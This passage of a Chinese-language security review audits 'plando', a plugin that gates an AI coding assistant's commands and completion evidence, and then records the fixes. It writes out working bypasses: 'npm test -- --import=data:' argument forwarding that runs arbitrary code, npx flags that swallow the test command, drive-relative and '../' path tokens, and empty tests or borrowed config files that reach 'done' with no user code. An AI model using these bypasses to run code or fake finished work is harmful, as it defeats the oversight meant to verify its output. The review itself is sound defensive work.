- **大小写与扩展名**：`NPX` / `npx.exe` / `npx.cmd` 剥壳行为一致。
- **G2 那条链现在是断的**：脚手架写 `scripts.test = npx tsx -e "…"` 被拒（理由「命令里的「-e」会让检查变成执行任意代码」），`package.json` **不落盘**；退一步走 `plando_card declare` + `plando_check run`（`npm test`）以非 0 退出，`AUTORUN-FULL.txt` **不生成**。

**为什么这次的「修好」可信**：§15 的修法是**剥壳重判**——剥掉 `npx` 自己的包装，剩下的 argv 当一条独立命令再过同一套闸门。
这在结构上保证「`npx` 后面能写什么」恒等于「裸命令能写什么」，洗白在数学上不可能，而不是「这轮想不到的写法还没试到」。624 组 0 洗白是这条结构性质的抽样确认。

### 16.3 R6 是**真闭合**，但盘符相对路径这一支还漏（R9）

- **合法写法 0/23 误杀**：`--outDir=dist`、`--outDir ./dist`、`node --test ./test/`、`src/../src/app.js`、`tsc -p ./tsconfig.json`、`go test ./...`、`--test-name-pattern=a:b`、`--test-name-pattern=foo/bar`、`.\x`、`-X pycache_prefix=.pycache`、`node --test test/*.test.js`、`vitest run src/`、`jest --testPathPattern=src`、`--env-file=.env` 等。
  其中 `src/../src/app.js` 与 `--outDir ./dist` 是**必须不被误杀**的两条（前者归一化后仍在项目内，后者是 vite 标准写法），实测都放行。
- **越界写法 0/20 漏**：`../x.js`、`sub/../../x.js`、`a/../../../x.js`、`C:\x`、`C:/x`、`\\server\share`、`/etc/passwd`、`--prefix=../x`、`--cache=../c`、`--outDir=../o`、`-o ../o`、`--results-directory=../r`、`--icu-data-dir=../i`、`--test ../x.js`、`--env-file=../e`、`-X pycache_prefix=../p`、`--rootdir=../r`、`--base=../b`、`--config=../c`（`=` 形式与分离形式都测了）。
- **归一化判深浅这条改对了**：`src/../src/app.js` 深度始终 ≥ 0 放行，`sub/../../x.js` 掉到 −1 拒。这是「按值的形状判」而不是「见过 `..` 就拒」，方向对。

#### R9【中，残余】盘符相对路径与「第二个等号」形态仍然漏

`unsafePathToken` 的盘符正则现在只认 `^[A-Za-z]:(?:[\\/]|$)`。这个收窄本身是对的（不这么收窄会误杀 `--test-name-pattern=a:b`），代价是**盘符相对路径完全绕过深度检查**：

```
放行  node C:evil.js            ← 相对 C: 盘的当前目录，不在项目里
放行  node c:..\..\x.js         ← 第一个 segment 是 `c:..`，不是 `..`，深度检查根本没触发
放行  vite build --outDir=C:dist
放行  tsc -p../tsconfig.json    ← 短开关贴值不取 `=`，整串当一个普通 token，深度 = +1
放行  node --test --prefix=a=../x   ← 只拿第一个 `=` 切值，value = `a=../x`，深度 = +1
放行  node --test --outDir==../x    ← value = `=../x`，同上
```

`c:..\..\x.js` 比 `C:evil.js` 严重：它**不需要攻击者知道 C: 盘的 cwd**——`..\..` 从任何目录都能往上退两级。
§15 把 `C:evil.js` 记成「要求项目不在 C: 盘且攻击者知道 C: 上的 cwd，实际不可利用」，对 `C:evil.js` 勉强成立，**对 `c:..\..\x.js` 不成立**。我上轮在 KNOWN-ISSUES 里记的「不可利用」要**收回一半**。

**修法与代价（实测，不是估计）**：把盘符规则扩成「值匹配 `^[A-Za-z]:[^\\/]`，**且**（token 里没有 `=` **或**盘符之后的部分里出现 `.` 或 `/`、`\`）」：

- 合法 token **30 条**：现规则误判 0，**新规则误判 0**（命令级 19 条合法写法复测也是 0）；
- 越界 token **23 条**：现规则漏 **6**，新规则漏 **2**；
- 新规则**多挡住的正是**：`C:evil.js`、`c:..\..\x.js`、`C:dist`、`D:icu`；
- **仍漏的 2 条**是另一支问题（只切第一个 `=`）：`--outDir==../x`、`--prefix=a=../x`。建议单独记 **R9-b**、进 KNOWN-ISSUES（造它需要 AI 在项目外有配合目录，独用不成链）。
- 为什么 `--test-name-pattern=a:b` 不会被这条误杀：它满足「有 `=`」，且盘符之后是 `b`（无 `.`、无分隔符），两个条件都不成立。

**不推荐的两种写法**：`^[A-Za-z]:` 一把抓（会误杀上面那种带冒号的合法参数值）；用 `fs.existsSync('C:\\')` 判「这是不是真盘符」（结果依赖运行环境，同一条命令在不同机器上判定不同，不可复现——评审里最不该出现这种）。

### 16.4 R7-a 只**部分闭合**：假文件堵上了，真文件没堵（R10）

先说**修对的地方**（这块 Lead 做对了，我不改口）：

- 工具层注入 `projectFiles` 之后，`写了 src/app.js` 只在文件真存在时才能当证据；`创建了完全不存在-abc123.py` 拒；`删了 node_modules 下的 500 个包` 拒；不带文件名的证据拒；`do.files` 指向不存在的文件也拒。
- `listProjectFiles` 出错时返回 `[]` → 所有 files 证据全拒，**fail-closed 方向是对的**（宁可把真证据拒掉，也不让假证据过）。这条我专门测了，方向正确，不要改。
- 所以 §14 里那条「唯一一张 done 可以拿假 files 证据短路」的路，**确实断了**。

#### R10【高，残余】`do.files` 可以点名**任何真实存在的文件**，包括脚手架自己写的

判据是「点名的文件在不在项目里」，不是「点名的文件是不是这张卡做出来的」。于是：

**(a) 端到端：3 张卡全部 done → `stage = done`，而用户业务文件是 `[]`。** 工具层，完整状态机：

```
① plando_scaffold  path=package.json  techId=t1  内容 {"name":"p","version":"1.0.0"}
   → 已写 package.json。
② 对 c1 / c2 / c3 各做一遍：
   plando_card action=start  id=cN                              → 卡片 cN 已 start。
   plando_card action=do     id=cN  files=["package.json"]       → 卡片 cN 已 do。
   plando_card action=done   id=cN  evidence={kind:'files',
        summary:'登录功能做完了，界面能显示'}                    → 卡片 cN 已 done。
③ plando_transition event=cards_done → 已推进：build → ship（cards_done）
   plando_transition event=ship_pass  → 已推进：ship → done（ship_pass）

**stage = done**
项目文件 = ["IDEA.md","TECH.md","package.json"]
用户业务文件 = []            ← 用户一行代码都没有
```

「登录功能做完了，界面能显示」这句话本身没问题（够具体、有交付物），`package.json` 也**真的存在**——两个条件都满足，判定就过了。问题在于这两个条件与「这张卡有没有被做出来」**没有任何关系**。

**(b) 脚手架自己写的东西被当证据（自我认证）**：`改了 package.json` 现在能过 files 证据。而 `package.json` 是 AI 自己能写的那 7 个文件之一。等于「先自己写一个配置文件，再拿它当自己干活的证据」。

**(c) 纯函数层还漏一层**：`改了 IDEA.md` 在 `doneCard` 纯函数层能过，因为 `ARTIFACT_FILES` 只在 `listProjectFiles` 里被排除；一旦调用方没注入 `projectFiles`（或注入不过滤的清单），产物文件就成了合法证据。默认放，与 (a) 叠加时更危险。

**为什么定「高」**：不需要任何伪造、不需要降级、不需要写一行用户代码，只用两个 API（`scaffold` + `card`）就能把 3 张卡走完、把状态机推到 `done`。这直接违反「不代写 + 验收」这条产品底线。

**修法方向（不是名单）**：
1. `do.files` 与 files 证据里出现 `scaffold.WHITELIST` ∪ `ARTIFACT_FILES` 中任何一个 → 拒。这两份名单**已经在代码里了**，做差集即可，不用新维护。
2. `doneCard` 拿卡片自己的 `do.files` 做对齐：证据里点名的文件必须是 `do.files` 的子集（而不是「项目里任何一个真文件」）。
3. 复用 16.6 的「业务文件数 > 0」前置条件——两处共用同一份 `listProjectFiles` 数据，一次改两处收益。

### 16.5 R7-b 只**部分闭合**：误放清零是真的，但误杀比上轮报的多，而且一句话就能绕（R11）

先说「Lead 治的不是自己造的病」这件事：**在我 §14 的 48 条自己的样本上，他的数字是对的。**

- 36 条空话：误放 **28/36 → 0/36**（我上轮测 28，他 §15 也写 28，完全对上）；
- 12 条真实理由：误杀 **0/12 → 1/12 = 8%**。被误杀的是 `时间不够，只做了输入框`。**这条不是他 §15 里说的那条故意拒的「时间不够」**——它有交付物（`输入框`），是条合格的真话，属于真误杀。
- 原因是机械的：删掉 `时间不够` 与 `了` 之后只剩 `只做输入框` = 5 个字符 < 6，且没有 marker（中文既不是数字也不是 ≥3 字母拉丁词）。

**换成更口语的纯中文真话，误杀率明显更高：3/9 = 33%。**

```
误杀  时间不够，只做了输入框
误杀  时间不够，只跑通构建
误杀  证书有问题，暂时跳过
放行  电脑坏了，重装系统要明天
放行  需求改成先做登录了
放行  接口文档还没给我，卡住了
放行  老板临时加了活，这周没空
放行  先做注册，登录放后面
放行  依赖装不上，先跳过这块
```

对照（本来就该拒的纯空话）6 条 **0 漏放**：`不想做了` / `算了` / `太难了` / `时间不够` / `不想学了` / `放弃`。
所以判据不是失效，是**在「短句 + 纯中文」这条窄带上采样不足**。

#### R11【中，新】`hasMarker` 是**一跳即过**的旁路：加一个数字或一个英文词就放行

新判据是「删掉空话词后剩 ≥6 个实质字符，**或**出现可指认标记（文件名 / 数字 / ≥3 字母拉丁词）」。后半句是短路——命中就不再看前半句：

```
放行  不想做了 2        放行  算了 demo      放行  太难了 vue
放行  放弃 abc          放行  随便 5         放行  跳过 1
放行  不做了 9          放行  哈哈哈哈 3     放行  算了 100
放行  太难了 3
```

**10/10 全过。** `哈哈哈` 加个 `3` 就变成「可指认对象」了。而且这个旁路与误杀是**同一个机制的两面**，能摆出严格的不对称：

```
拒   时间不够，只跑通构建     ← 人话，有交付物，被误杀
放   时间不够，只跑通 demo     ← 同一句，只把「构建」换成英文，就过了
```

一边把中文真话拒掉，一边让「算了 demo」放行。这不是「判据偏严」，是判据在**语言形态**上分了叉。

另外新造的空话（词表里没有的）仍有泄漏：我新写 24 条不在 `DOWNGRADE_VAGUE` 里的句式，漏 **6/24**（`这块来不及弄`、`一时半会弄不完`、`这个事情比较费劲`、`精力实在跟不上`、`拖到后面再说`、`搞起来太麻烦`）。

**为什么定「中」而不是「高」**：需要 AI 主动撒谎，且 `cards_done` 还有「`realDone.length > 0`」兜底，全降级到不了 `done`。它影响「降级这条路好不好走」，不是「最终能不能混过去」。

**修法方向**：取消 `hasMarker` 的短路地位，改成**两条都要满足**——「有可指认标记」**且**「删掉空话词后剩 ≥4 字」（6 降到 4，给 `只做输入框` 这种短句留活路）。数字和英文词本身不构成「可指认的对象」：`demo`、`vue`、`abc`、`2` 都不是交付物。§15 自己写了「词表只做删除、不做判决」——那就别让 marker 去做判决。更稳的做法是把这条改成**引导式追问**（拒绝理由里直接给两个带交付物的模板），而不是继续调词表与字数。

### 16.6 R3 是**未闭合**：R12 —— 零测试文件也能让「检查通过」，一路到 `done`

这是这轮最该先修的洞，因为它**不需要任何欺骗**，也不需要 R7-a / R7-b 里的任何东西，更不需要写用户代码。

**物理事实**：`node --test` 在项目里**一个测试文件都没有**时，退出码是 **0**。

```
node --test（0 个测试文件）                          exit=0
node --test nonexistent/**/*.test.js                 exit=0
npm test --if-present（package.json 里没有 test 脚本） exit=0
```

而 M4 的判据是 `last-check.json` 的 `ok`（等于「退出码是不是 0」）。于是：

**复现 A（用脚手架造一个「合法但空」的包）**——工具层，完整链路：

```
① plando_scaffold path=package.json content {"name":"p","version":"1.0.0","scripts":{"test":"node --test"}}
   → 已写 package.json。        ← 白名单文件、合法脚本值，没有任何可疑之处
② 对 c1 / c2 / c3 各做：
   plando_card  action=declare id=cN command=npm test → 已为卡片 cN 声明检查命令：npm test
   plando_card  action=start   id=cN                  → 卡片 cN 已 start。
   plando_check action=run     name=cN                → · 检查 cN：通过｜退出码 0
   last-check.json = {"ok":true,"exitCode":0}
   plando_card  action=done    id=cN evidence={kind:'check', summary:'测试跑通了，退出码 0'}
                                                      → 卡片 cN 已 done。
③ event=cards_done → 已推进：build → ship（cards_done）
   event=ship_pass  → 已推进：ship → done（ship_pass）

**stage = done**
项目文件 = ["IDEA.md","TECH.md","package.json"]
用户业务文件 = []            ← 用户一行代码都没有
```

**复现 B（更短，连 `package.json` 都不用）**：

```
plando_card  action=declare id=c1 command=node --test   → 已为卡片 c1 声明检查命令：node --test
plando_check action=run     name=c1                     → · 检查 c1：通过｜退出码 0
plando_card  action=done    id=c1 evidence={kind:'check', summary:'测试跑通了'}
                                                        → 卡片 c1 已 done。
项目文件 = ["IDEA.md","TECH.md"]      ← AI 一个字都没写
```

**这不是 M4 修错了，而是 M4 的判据太薄**：「检查通过」的物理含义只剩一个 `exit code 0`，而 `exit code 0` 在「什么都没跑」时也会出现。
对照组证明方向是对的：项目里放一个**必然失败**的测试（`assert.equal(1, 2)`）时，`run` 退出码 1、`done` 被 M4 拒（理由「检查上次没通过（退出码 1）」）。所以 M4 在「有输出且失败」时完全有效，**在「零输出」时完全失效**。

**修法方向（三条，都便宜）**：

1. **把「项目里有没有用户代码」做成 `done` 的前置条件**（而不是只做 files 证据的后置核对）：`listProjectFiles` 返回的业务文件数为 0 时，`kind:'check'` 的证据一律判为「空检查」。它已经存在、已经排除产物与 `node_modules`、已经 fail-closed，**直接复用，零新代码面**。与 R10 的修法共用同一份数据。
2. **（可选加强）要求输出里有「跑了东西」的痕迹**：`node --test` 会打印 `ℹ tests N`，`npm test` 会打印 `> p@1.0.0 test`。但这条要按工具分别定义，又变成名单——所以只作为第 1 条的补充，不单独立规。
3. **拒绝理由要教它怎么办**：`plando：检查通过了但项目里还没有测试文件——下一步：先写一个断言当前功能会失败的测试（如 test/login.test.js），让它先红再绿。`

### 16.7 R13【高，新】`npm test -- <参数>` 是第二条洗白前缀——`npx` 修好之后，这一类原样复活

§15 的方法论结论是「名单是枚举攻击面，补不完；结构化剥壳才是修一类」。这句话对 `npx` 完全成立。**但它只修了 `npx` 这一个剥壳对象。** 同一个结构还有第二个实例：**包管理器把「脚本名之后的参数」转发给自己执行的脚本**。

```
直接写（被拒）                            加 `npm test --` 前缀（放行）
node --test --import=./h.mjs        拒    npm test -- --import=./h.mjs        放
node --test --loader=./h.mjs        拒    npm test -- --loader=./h.mjs        放
node --test -r ./h.mjs              拒    npm test -- -r ./h.mjs              放
node --test --test-reporter=./h.mjs 拒    npm test -- --test-reporter=./h.mjs 放
```

**「会让 node 加载任意模块」的开关 10 条，全部被这样洗白（10/10）**。没被洗白的两条是 `--test-reporter-destination` 与 `--redirect-warnings`——它们撞上了「写文件开关整类拒」那道**全 argv 扫**的闸门（0/2）；`--inspect` 本来就两头都放。

根因在 `validateArgv` 的闸门顺序：解释器那几道（`INTERPRETER_DENY_FLAGS`、`FLAGS_WITH_SAFE_VALUES`、`GLUED_FLAGS_BY_BASE`）都是**按 `argv[0]` 判**的。`npm test -- X` 的 `argv[0]` 是 `npm`，于是那几道**一道都不跑**；写文件那道是全 argv 扫，所以不受影响。这与 R5 的根因**一模一样**（`npx` 的 `argv[0]` 是 `npx`，于是后面全不看）。

**最狠的一条：`data:` URI 让它连「项目里得有个模块文件」都不需要。**

```
闸门：node --test --import=data:text/javascript,<urlencoded>   → 拒
闸门：npm test -- --import=data:text/javascript,<urlencoded>   → 放行
实跑：exit=0，内联模块被执行，用户项目里凭空多出一个文件
```

`--loader=data:…` 同样成立（`-r data:…` 不行，`require` 不认 `data:`，但 `--import` / `--loader` 认）。

**端到端（工具层，AI 只做两件事：声明一条检查命令 + 让脚手架写 `package.json`）**：

```
用户项目初始文件（AI 一个字都没写）：package.json, test/login.test.js
待声明命令：npm test -- --import=data:text/javascript,…（一行内联的 fs.writeFileSync）
闸门裁定：放行
对照「直接写」：拒绝        ← 只差一个「npm test -- 」前缀

c1: declare → 已为卡片 c1 声明检查命令：npm test -- --import=data:…
    run     → · 检查 c1：通过｜退出码 0
    R13-PWNED.txt = true   内容 = ARBITRARY-CODE-RAN
    done    → 卡片 c1 已 done。
c2: 同上
cards_done → 已推进：build → ship
ship_pass  → 已推进：ship → done
**stage = done**
```

**第二条入口：脚手架单独就能造出这条链（单层写法被挡，两层没挡）**：

```
scripts.test  = "node --test --import=<data:>"     → 脚手架**拒绝**（挡对了）
scripts.build = "npm test -- --import=<data:>"     → 脚手架**放行**
```

实测：脚手架写 `{"test":"node --test","build":"npm test -- --import=<data:>"}` → **落盘**；然后 `declare command="npm run build"`（闸门放行，因为 `npm run build` 是合法脚本名）→ `run` 通过 → `SCAF-PWN.txt` 落盘。**用户代码一行没写，脚本值单看每一段都合法。**

**为什么定「高」**：等价于「`plando_check` 里的一次任意代码执行」，不需要用户写代码、不需要降级、不需要假证据，而且能一路推到 `stage = done`。它绕过的正是 §15 认为已经修好的那一类。

**修法与代价（实测）**：「转发参数闸门」——`<包管理器> <脚本> [--] <参数…>` 里，脚本名之后的参数要按**解释器的口径**再判一遍（`--import` / `--loader` / `--experimental-loader` / `--require` / `-r` 命中即拒；`--test-reporter=` 的值不在内置名单里即拒）。

- 合法转发写法 10 条（`npm test -- --coverage`、`npm test -- --watch`、`npm test -- --runInBand`、`npm run lint -- --fix`、`npm run build -- --mode production`、`npm test -- --reporter=verbose`、`npm test -- --updateSnapshot`、`npm test -- --testPathPattern=src`、`pnpm test -- --coverage`、`yarn test -- --watchAll`）：**误杀 0**；
- 危险转发写法 6 条（`--import=./h.mjs`、`--require=./h.mjs`、`--loader=./h.mjs`、`-r ./h.mjs`、`--test-reporter=./h.mjs`、`--import=data:…`）：**挡住 6/6**；
- 这条闸门只扫「脚本名之后」的参数，所以 `mocha --require ./setup.js` 这种**直接写**的合法用法**完全不受影响**（它走的是解释器原有的闸门）。

**一个坑要注意**：`npm test sub/pwn.js`（**不带** `--`）也会把 `sub/pwn.js` 转发进去（实测 `node --test sub/pwn.js` 真被执行）。所以闸门必须覆盖「脚本名之后的**所有**非开关 token」，不能只覆盖 `--` 之后。

### 16.8 回答 Lead 说「我判不了」的三件事

#### (1) `C:evil.js` 该不该拦、怎么拦 —— **该拦，但不是我原来给的那条规则**

我上轮在 KNOWN-ISSUES 里把它记成「不可利用」，这次**收回一半**：`C:evil.js` 确实需要知道 C: 盘的 cwd，但 `c:..\..\x.js` 不需要（`..\..` 从哪个目录都能往上退）。所以它不是理论问题，是「换一个写法就可用」的问题。

**建议规则**（16.3 量过代价）：

> 值（`=` 之后，或整个 token）匹配 `^[A-Za-z]:[^\\/]`，**且**（token 里没有 `=` **或** 盘符之后的部分里出现 `.` 或 `/`、`\`）→ 拒。

- 合法 token 30 条 → 误判 **0**；越界 token 23 条 → 漏从 **6 降到 2**（且那 2 条属于 R9-b「第二个等号」这一支）。
- `--test-name-pattern=a:b` 不受影响：有 `=`，且盘符之后是 `b`（无 `.`、无分隔符），两个条件都不成立。

#### (2) `npx vitest`（只有包名、会下载最新版）该不该关 —— **该关，但只关「光秃秃」这一种形态**

先说这轮新测出来、比我上轮说的更重的事实。**`npx <名字>` 日常跑的不是本机同名工具，而是从 registry 下载的同名包**：

```
本机 node = v24.21.0（C:\Program Files\nodejs\node.exe）
npx node --version  → v27.0.0-alpha.0.1.1
npx 缓存里装下来的包：node@27.0.0-alpha.0.1.1（preinstall: node installArchSpecificPackage）、node-bin-setup@1.1.4
```

```
白名单 39 个工具里，本机 PATH 上有的只有 11 个（node npm python python3 py pytest pip dotnet java ruff uv）；
剩下 28 个 `npx <名字>` 只能去 registry 下载：
pnpm yarn cargo go mvn gradle deno bun tsc vitest jest mocha eslint prettier mypy black
vite next react-scripts webpack rollup esbuild parcel nodemon pm2 tsx ts-node serve
```

其中几个名字在 registry 上是**完全不同的程序**，还带安装钩子：

```
npx --yes tsc --version → exit=1，输出 "This is not the tsc command you are looking for"
   实际装的是 tsc@2.0.4（registry 描述：「A deprecated release of the TypeScript compiler」，仓库 github.com/basarat/tsc）
   对照：npx --package typescript -- tsc --version → Version 7.0.2
registry 上有安装钩子的：deno（postinstall: node ./install.cjs）、bun（postinstall: node install.js）、esbuild（postinstall: node install.js）
```

**结论分两层**：

- **不关的理由（这一层我同意 Lead）**：它是**供应链风险**，不是**闸门绕过**。剥壳之后 `npx X` 与 `X` 的判定完全相同，624 组矩阵 0 洗白已证明。供应链风险的真正解法是「让用户自己 `npm i -D`」，不是插件去猜哪个包可信。
- **但要关「光秃秃的 `npx <工具>`」**（这一层是我要加的）：`npx vitest` 与 `npx vitest run` 在**闸门眼里一模一样**，在 **npm 眼里完全不同**——前者是「下载并执行最新版 vitest 的默认行为」（交互式 watch，在守卫里只会挂满 60 秒超时），后者才是「跑一遍测试」。真跑工具都会带子命令或参数。
  - 代价实测：§9.6.2 的 23 条合法写法里，光秃秃的只有 `npx webpack` 这 **1 条**；而它本身就会挂 60 秒超时（§15 的 KNOWN-ISSUES 里也记着 `--watch` 挂超时）。
  - 规则：剥壳后 `rest.length === 1`（只剩包名、没有任何参数）→ 拒，理由写成「`npx webpack` 会下载并执行最新版——写成 `npx webpack --mode production`，或直接用已装的 webpack」。

#### (3) 「保留 npx 开关白名单」这个理由成不成立 —— **理由成立，但名单里有两项是错的**

你的原话：「枚举的是 npx 自身的开关（数目有界、随 npm 版本收敛），不是『任意命令的任意参数』」。**这个区分是对的，我同意**，而且有实测支持：624 组矩阵 0 洗白，说明这条名单本身没变成新的绕过面（它挡住的 `-p` / `--package` / `--node-options` / `-c` 都是真洞）。

**但「无副作用」不能按名字猜，必须逐个实测语义**——这轮在名单里找到两项不合格：

```
项目里预置一个必然失败的测试（真跑了必定 exit 1）
npx node --test              → exit=1  真跑了测试=是
npx -y node --test           → exit=1  真跑了测试=是
npx --no-install node --test → exit=1  真跑了测试=是
npx -q / --quiet / -s / --silent node --test → exit=1  真跑了测试=是
npx --no node --test         → exit=0  真跑了测试=**否**
npx --no-cache node --test   → exit=0  真跑了测试=**否**
```

`--no` 与 `--no-cache` 都**不是**「减少输出的开关」：npm 的 `--no` 是「布尔取反前缀」，它会把后面的 token 当 npm 配置解析（`npm warn Unknown cli config "--test"`），于是整条子命令被吃掉，node 拿到空 argv → 读空 stdin → 立即 `exit 0`。

端到端后果（工具层，3 张卡全走 `npx --no`）：

```
declare 「npx --no node --test」→ 已为卡片 c1 声明检查命令
run  → · 检查 c1：通过｜退出码 0     （stderr 里只有一句 npm warn Unknown cli config "--test"）
done → 卡片 c1 已 done。            （c1 / c2 / c3 全一样）
cards_done → 已推进：build → ship
ship_pass  → 已推进：ship → done
**stage = done**，而那个必失败的测试文件一行都没跑
```

**建议**：
1. 把 `--no` 与 `--no-cache` 从 `NPX_SAFE_FLAGS` 里删掉（代价：实测没有任何合法写法依赖它们；用到它们的 3 条里，`--no` 那两条在真实 npx 下本来就是跑错的）。
2. 加一条**断言式测试**，把「名单项无害」从**判断**降级成**可执行断言**：

> 项目里放一个必然失败的 `test/must-fail.test.js`，对 `NPX_SAFE_FLAGS` 的每一项断言 `npx <flag> node --test` 的退出码 **≠ 0**。任何一项让退出码变成 0，就说明它吞掉了子命令。

### 16.9 回归：这一轮的所有改动没有把别的地方弄坏

| 回归面 | 结果 |
|---|---|
| §9.6.2 的 23 条常见 build 写法（`checks` 层） | 放行 **21/23**；拒的 2 条是 `rimraf dist && vite build` 与 `cross-env NODE_ENV=production vite build`——**这两条在 `checks` 层从来就不该由它管**（壳是 `scaffold` 的职责），`scaffold` 层 23/23 全过 |
| 同样 23 条写进 `scripts.test`（`scaffold` 层） | **23/23 放行，0 误杀** |
| 4 条友好壳（`scaffold` 层） | `rimraf dist && vite build` 放、`cross-env NODE_ENV=production vite build` 放；`env-cmd -f .env vue-cli-service build` 拒、`dotenv -e .env -- vite build` 拒（`env-cmd` / `dotenv` 这两种壳的语义与实现不符，属于设计取舍，不是回归） |
| §9.3 的 8 条 payload（`checks` 层） | **漏 0/8** |
| G1 的 14 条 | **漏 0/14** |
| `scaffold` 的 `scripts` 值层（`node -e` / `python -X utf8 -c` / `npm install` / `curl` / `&&` 后接 `node -e` / `NODE_OPTIONS=` 前缀） | **漏 0/5** |
| `&&` 链 | `npm test && node pwn.js` 之类在 `checks` 层**放行**（见 16.7 的机制说明：`shell:false` 下 `&&` 只是字面参数，不是分隔符；真正危险的是 npm 的**参数转发**），`scaffold` 层按段校验、每段都过 |

**一个必须说清的回归认知**：`checks` 层用 `spawnSync(..., shell:false)` 执行，所以 `&&` **不会**被 shell 解释——`npm test && node sub/pwn.js` 实际跑的是 `npm test && node sub/pwn.js` 这一串 argv，`&&` 只是被 npm 拼进 scripts 命令串的字面量。
我一开始把它当成「链式执行」去测，差点得出错误结论；后来用「不带 `&&` 的等价写法 `npm test sub/pwn.js`」做对照，两者都能让 `sub/pwn.js` 被执行，才定位到真正的原因是**npm 的参数转发**（R13），而不是 `&&` 被解释。这条对照已经写进 16.7。

### 16.10 判决有没有变

**没变：`v0.1.0` 现在还是不能发（§6 的结论继续有效）。** 但阻塞项的**性质**变了，这决定下一步该干什么：

- **§6 当时的主要阻塞是「命令层能跑任意代码」**。这一层这轮确实收住了两个大类：R5（`npx` 洗白）与 R6（路径类参数）都是**真闭合**——0 洗白、0 误杀、0 漏，而且修法是结构性的（剥壳 / 按形状判），不是补名单。
- **现在的第一优先级是「产出为零也能到 `done`」**，共三条路：
  - **R12**：0 个测试文件也让「检查通过」成立（`node --test` → `exit 0`），3 张卡走完 `stage = done`，用户业务文件 `[]`。**不需要任何欺骗。**
  - **R10**：`do.files` 点名一个**真实存在**的文件（哪怕是脚手架自己写的 `package.json`）就能当交付证据，3 张卡走完 `stage = done`，用户业务文件 `[]`。**不需要任何伪造。**
  - **R13**：`npm test -- <参数>` 洗白（10/10 条模块加载开关可洗白，`data:` URI 连项目文件都不需要），且脚手架单独就能造出这条链。**它同时是一条任意代码执行。**
- **R9**（盘符相对）与 **R11**（降级理由旁路）是「修法便宜、本轮没收」的两个小口子。

**发版门（我的建议，按顺序）**：

1. **R12 必修**：`done` 前要求「项目里至少有一个用户业务文件」（复用 `listProjectFiles`，零新代码面）。
2. **R13 必修**：加转发参数闸门（脚本名之后的参数按解释器口径再判），6/6 挡住、0 误杀。
3. **R10 必修**：`do.files` / files 证据禁止点名 `scaffold.WHITELIST` ∪ `ARTIFACT_FILES` 里的文件；证据与卡片自己的 `do.files` 做对齐。
4. **R5 的名单修正必修**：删 `--no` / `--no-cache`，加「名单项必须让子命令真跑」的断言测试。
5. **R9 顺手修**（5 行、0 误杀）；**R11 建议改成引导式追问**，别继续调词表与字数。

### 16.11 这轮的方法论修正（写进下一轮的评审口径）

**第一条**：§15 说「名单是枚举攻击面，补不完；结构化剥壳才是修一类」。这句对，但**只修一类还不够，要问「同类还有谁」**。

`npx` 那一类修好之后，同一结构在**上一层**原样复活：`<包管理器> <脚本> -- <参数>` 也是「把 argv 转发给另一个程序」。两处都是「入口程序看到的 argv 不是下游程序看到的 argv」。所以正确的问法不是「`npx` 后面能写什么」，而是：

> **这条命令最后实际执行的那个程序，收到的 argv 是什么？如果不是我审的那一份，就再审一遍。**

按这个问法过一遍，能一次找到 `npx`、`npm`/`pnpm`/`yarn` 转发、`cross-env`/`rimraf` 这类「壳」三类——第三类在 `scaffold.js` 里已经用「剥壳 + 每段单独校验」修过了，修法就在隔壁文件里。

**第二条**：**「修好了」要用「另一端还能不能到 `done`」来验，不是用「这一条命令判得对不对」来验。**
R5 / R6 在纯函数层是满分，但 R12 / R10 在工具层能把状态机推到 `done` 而用户代码是 `[]`。所以这轮每个「闭合」判定我都跑了一遍完整状态机，只有 G2 那条链是真的跑不到 `done`。

**第三条**（对上一轮的自我修正）：我上轮把 `C:evil.js` 记成「实际不可利用」是错的，漏了 `c:..\..\x.js` 这个不需要知道 cwd 的变体。
**「需要额外条件」不等于「不可利用」——要看这个条件是不是攻击者能自己造出来的。** `..\..` 就是他自己造的。

**第四条**：**「名单里的每一项无害」不能靠读名字判断，要靠一条会让它失败的测试。**
`NPX_SAFE_FLAGS` 里的 `--no` 与 `--no-cache` 单看名字像「减少输出」，实测却会吞掉整条子命令让退出码变 0。凡是「枚举出来的无害项」，都应该配一条「让它必须产生可观测失败」的断言——这是名单类修法唯一靠谱的护栏。

## 17. §16 的处置记录（Lead 收到第五轮复核后同一轮内完成）

### 17.0 总账：§16 提的 6 项，这一轮全部有落点

| 项 | §16 的判决 | 这一轮做了什么 | 现在的状态 |
|---|---|---|---|
| **R13**（高，新）`npm test -- <参数>` 洗白 | 未闭合，10/10 可洗白 | 加「转发参数闸门」：脚本名之后的**所有** token 按解释器口径重判（`unsafeForwardedArg`） | **闭合**：7/7 挡住，6 条合法转发 0 误杀 |
| **R12** 零测试文件也能「检查通过」 | 未闭合，不需要欺骗 | `doneCard` 加前置闸：项目里必须至少有一个**用户自己的产出**；`listProjectFiles` 同步排除脚手架能写的 7 个配置文件 | **闭合**：`declare→run→done` 三步链在空项目上走不通 |
| **R10** `do.files` 点真实存在的配置文件即可交付 | 未闭合 | 同上前置闸 + `normalizeProjectFiles` 自己再排一次模式产物（不只依赖调用方） | **闭合**：`package.json` 不再能当证据 |
| **R11** 降级理由「空话 + 数字」旁路 | 未闭合（口语 3/9） | 数字不再单独算「可指认的标记」；`DOWNGRADE_VAGUE` 补 7 个「往后推」的口语词 | **闭合**：12/12 挡住，12/12 真理由不误杀 |
| **R9** 盘符相对路径 `c:..\..\x.js` | 未闭合（我上轮判「不可利用」是错的） | `unsafePathToken` 按形状补三条：盘符相对、短开关贴 `..`、`=` 后分段再判 | **闭合**：7/7 挡住，3 条合法写法（含 `--test-name-pattern=a:b`）0 误杀 |
| **NPX_SAFE_FLAGS 的 `--no` / `--no-cache`** | 未闭合，会吞子命令 | 两项删除；新增 `test/npx-flags.test.js`，对名单每一项跑**真 npx** 并断言退出码透传 | **闭合**：7 项全过「必须让子命令真跑」的断言 |

外加 §16 顺手报的 **`SAFE_SCRIPT_KEYS` 3/24 假杀**（`preview` / `clean` / `build:prod`）：按 §15 的结论改成「小名单 + 冒号命名空间」，并加了**行为级**漂移断言（同一个键，`plando_scaffold` 与 `npm run <键>` 必须同结论）。

测试从 397 条增加到 **404 条**，`node --test` 全绿；`check-docs` / `verify-pack` / `smoke-pack` / `release-check` 四条验证脚本全绿。

### 17.1 R13 的修法：把「转发」当成一次剥壳，不是加一张黑名单

§16 指出的机制值得原样抄在这里，因为它决定了修法该长什么样：

> `npm test -- --import=./h.mjs` 里，npm 会把 `--import=./h.mjs` **转发**给它跑的脚本。
> 而解释器那几道闸门全部按 `argv[0]` 判——`argv[0]` 是 `npm`，于是一道都不跑。

